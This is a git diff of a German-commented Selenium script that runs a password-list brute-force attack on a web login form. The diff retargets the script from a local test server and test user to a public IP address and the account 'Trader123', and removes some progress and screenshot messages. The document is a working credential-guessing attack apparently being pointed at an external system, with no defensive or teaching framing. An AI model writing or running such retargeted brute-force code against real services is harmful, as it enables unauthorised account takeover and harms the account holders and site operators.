@@ -25,9 +25,9 @@ import time
 # ============================================
 # KONFIGURATION
 # ============================================
-TARGET_URL = "http://127.0.0.1:5001/login"
-USERNAME = "marc"                      
-PASSWORD_FILE = "passwords.txt"         
+TARGET_URL = "http://141.87.56.41:5001/login"
+USERNAME = "Trader123"                      
+PASSWORD_FILE = "passwords.txt"
 HEADLESS = False                        
 DELAY = 0.5                             
 
@@ -129,7 +129,6 @@ def main():
     print()
 
     # Chrome WebDriver starten
-    print("[+] Starte Chrome WebDriver...")
     driver = setup_driver(headless=HEADLESS)
 
     success = False  # Flag für erfolgreichen Login
@@ -151,12 +150,6 @@ def main():
                 print(f"Passwort: {password}")
                 print("=" * 50)
 
-                # Optional: Screenshot vom Erfolg
-                driver.save_screenshot("login_success.png")
-                print("[+] Screenshot gespeichert: login_success.png")
-                print()
-                print("[+] Browser bleibt geöffnet - Du kannst dich jetzt im Browser umsehen!")
-                print("[+] Drücke Strg+C um das Skript zu beenden und den Browser zu schließen.")
 
                 # Browser offen lassen - auf Benutzerinteraktion warten
                 input("\n[>] Drücke Enter um den Browser zu schließen...")
